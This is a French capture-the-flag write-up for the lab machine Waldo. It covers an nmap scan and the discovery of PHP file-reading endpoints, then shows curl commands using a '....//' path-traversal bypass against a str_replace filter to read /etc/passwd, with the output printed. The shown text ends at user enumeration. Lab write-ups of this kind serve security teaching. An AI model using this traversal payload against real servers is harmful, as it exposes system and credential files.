# Waldo writeups by Seyptoo.

![forthebadge made-with-python](http://image.noelshack.com/fichiers/2019/02/2/1546971003-capture-du-2019-01-08-19-09-54.png)

Informations
----
    Ip :  10.10.10.87       Created by :  strawman & capnspacehook 
    Level : Easy            Base Points : 30
    
Nmap Scan
----
    Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-08 19:08 CET
    Nmap scan report for 10.10.10.87
    Host is up (0.065s latency).
    Not shown: 997 closed ports
    PORT     STATE    SERVICE        VERSION
    22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
    |_  256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
    80/tcp   open     http           nginx 1.12.2
    |_http-server-header: nginx/1.12.2
    | http-title: List Manager
    |_Requested resource was /list.html
    8888/tcp filtered sun-answerbook

Le port 22 pour le **SSH**, le 80 pour le serveur **HTTP**. Allons voir ça de beaucoup plus près. Nous avons également des informations sur le serveur HTTP il y'a un fichier qui se nomme /list.html donc nous allons énumérer ça.

HTTP
----
Sur la page HTTP on peut pas faire grand chose on peut seulement ajouter des listes.. mais cela n'est pas suffisant pour l'énumération.
Si nous regardons la source de la page il y'a des informations. Il y'a un fichier javascript donc je suis aller voir de plus près.

    <html>
      <head>
        <title>List Manager</title>
        <script src="/list.js"></script>
        [...SNIP...]
        
Il y'a des fonctions sur le fichier javascript. Donc nous avons trouver plusieurs fichiers PHP.

fileWrite.php (Fichier pour créer des listes) Paramètre : listnum=&data=<br />
fileDelete.php (Fichier pour supprimer des listes) Paramètre : listnum=<br />
fileRead.php (Fichier pour lire des fichiers sensibles) Paramètre : file=<br />
dirRead.php (Fichier pour lire les répértoires) Paramètre : path=<br />

On va plus s'intéréssé au fichier fileRead.php et dirRead.php ils sont beaucoup plus utiles.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=fileRead.php"|jq -r .file
    <?php


    if($_SERVER['REQUEST_METHOD'] === "POST"){
            $fileContent['file'] = false;
            header('Content-Type: application/json');
            if(isset($_POST['file'])){
                    header('Content-Type: application/json');
                    $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                    if(strpos($_POST['file'], "user.txt") === false){
                            $file = fopen("/var/www/html/" . $_POST['file'], "r");
                            $fileContent['file'] = fread($file,filesize($_POST['file']));  
                            fclose();
                    }
            }
            echo json_encode($fileContent);
    }
    
Voilà on a réussis à lire le fichier fileRead.php comme pour on peut le voir il y'a du str_replace.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
    {
      "file": false
    }
    
Donc si nous essayons de lire le fichier passwd sur le dossier /etc.

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
    {
      "file": false
    }
    
Donc impossible de lire ça, nous devons bypass ça. Il y'a du str_array() donc pour bypass ça vous devez simplement faire ....//....//....//....//....//....//directory/file

    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=....//....//....//etc/passwd"|jq -r .file
    root:x:0:0:root:/root:/bin/ash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    operator:x:11:0:operator:/root:/bin/sh
    man:x:13:15:man:/usr/man:/sbin/nologin
    postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
    squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
    xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    postgres:x:70:70::/var/lib/postgresql:/bin/sh
    cyrus:x:85:12::/usr/cyrus:/sbin/nologin
    vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
    nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin

Parfait nous avons réussis à lire le fichier passwd.

    root@:~/# cat passwd_list|awk -F: '{print $1, $6}' passwd_list|grep '/home'
    nobody /home/nobody
